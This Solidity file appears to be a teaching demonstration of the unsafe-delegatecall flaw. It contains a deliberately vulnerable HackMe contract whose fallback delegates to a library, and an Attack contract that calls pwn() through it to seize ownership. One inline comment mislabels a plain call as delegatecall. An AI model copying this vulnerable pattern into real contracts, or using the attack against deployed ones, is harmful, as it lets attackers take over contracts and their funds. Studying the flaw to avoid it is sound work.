// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/*
Unsafe delegatecall

What is delegatecall?
A -> B
Run your code inside my context (storage, msg.sender, msg.value, msg.data, ect...)
1. delegatecall preserves context
2. storage layout must be the same for A and B
*/

/// 1. delegatecall preserves context
contract HackMe {
  address public owner;
  Lib public lib;

  constructor(Lib _lib) {
    owner = msg.sender;
    lib = Lib(_lib);
  }

  fallback() external payable {
    (bool success, ) = address(lib).delegatecall(msg.data);
    require(success, "!success");
  }
}

contract Lib {
  address public owner;

  function pwn() public {
    owner = msg.sender;
  }
}

contract Attack {
  address public hackMe;

  constructor(address _hackMe) {
    hackMe = _hackMe;
  }

  function attack() public {
    /// We will call the hackMe Contract and execute the func "pwn", but there is no func "pwn" in hackMe so fallback will be triggered which then delegatecall to Lib with the same execute func: "pwn" but this time Lib have this function which will change the current owner to msg.sender, but because we use delegatecall, the owner that will be change is not the Lib one but the hackMe one.
    (bool success, ) = hackMe.call(abi.encodeWithSelector(Lib.pwn.selector)); // Use delegatecall for preserving msg.sender and change the hackMe owner to the caller (here the new hackMe owner will be this contract address)
    require(success, "!success");
  }
}
